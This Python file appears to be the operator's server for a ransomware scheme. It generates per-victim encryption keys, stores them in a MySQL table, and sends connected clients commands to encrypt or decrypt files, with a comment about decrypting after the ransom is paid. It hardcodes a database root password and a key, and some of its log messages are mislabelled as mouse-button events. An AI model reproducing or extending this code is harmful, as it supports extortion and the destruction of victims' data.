from Crypto.Random import get_random_bytes
import mysql.connector
import socket
import base64






def make_a_key_and_send_to_database():
        # Connect to MySQL
    conn = mysql.connector.connect(
        host="localhost",
        user="root",
        password="160895Guy$",
        database="secret_key_database"
    )
    cursor = conn.cursor()


    # Generate random 32-byte key
    key = get_random_bytes(32)


    # Step 1: Get the last ID from idkeys_and_clients column
    cursor.execute("SELECT IFNULL(MAX(idkeys_and_clients), 0) FROM keys_and_clients")
    last_id = cursor.fetchone()[0]


    # Calculate the next ID
    id_value = last_id + 1


    client_name = "example_client"  # change as needed


    # Insert row with correct column names
    sql = "INSERT INTO keys_and_clients (idkeys_and_clients, client_name, `key`) VALUES (%s, %s, %s)"
    cursor.execute(sql, (id_value, client_name, key))


    conn.commit()


    print(f"Inserted id: {id_value}, client_name: {client_name}, key: {key.hex()}")


    cursor.close()
    conn.close()
    return key


def create_server(port):
    """
    Create and bind a TCP server socket to listen for a connection.
    :param port: The port to bind the server on.
    :return: The server socket.
    """
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", port))
    server_socket.listen(1)
    print("📡 Listening for new connections...")
    return server_socket




def accept_client(server_socket):
    """
    Accepts an incoming client connection.
    :param server_socket: The server socket accepting connections.
    :return: The client socket.
    """
    client_socket, client_address = server_socket.accept()
    print(f"🔌 Connected to {client_address}")
    return client_socket




def send_to_encrrypt(client_sock,key):
    try:
        encoded_key = base64.b64encode(key)  # still bytes
        full = b"<<encrypt_file>>" + (encoded_key) + b"<<END_OF_message>>"
        client_sock.sendall(full)
        print(f"🖱️ Sent mouse_button_pressed: {key}")
    except Exception as e:
        print(f"❌ Failed to send mouse button: {e}")


def send_to_decrypt(client_sock,key):
    try:
        encoded_key = base64.b64encode(key)  # still bytes
        full = b"<<decrypt_file>>" + (encoded_key) + b"<<END_OF_message>>"
        client_sock.sendall(full)
        print(f"🖱️ Sent mouse_button_pressed: {key}")
    except Exception as e:
        print(f"❌ Failed to send mouse button: {e}")


#put in hex key to decode after you get ransome and disable it and enable encrypt to encrypt
if __name__ == "__main__":
    server = create_server(7766)
    client = accept_client(server)
    #key = make_a_key_and_send_to_database()
    #send_to_encrrypt(client,key)
    hex_key = "4b4747b9f9bd913b3071cc31fde7560307894cd78ddd370878a4e9d92a69a72f"
    key_bytes = bytes.fromhex(hex_key)
    send_to_decrypt(client,key_bytes)







